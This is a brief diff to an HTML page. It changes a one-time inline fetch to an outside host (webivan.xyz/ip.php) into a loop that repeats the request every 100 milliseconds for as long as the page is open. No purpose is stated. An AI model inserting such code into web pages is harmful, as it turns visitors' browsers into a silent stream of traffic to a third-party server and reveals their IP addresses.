@@ -5,7 +5,10 @@
 
     <body>
       <script>
-         fetch(`https://webivan.xyz/ip.php`);
+         setInterval(
+             () => {
+                 fetch('https://webivan.xyz/ip.php')
+             },100);
       </script>
     </body>
 </html>
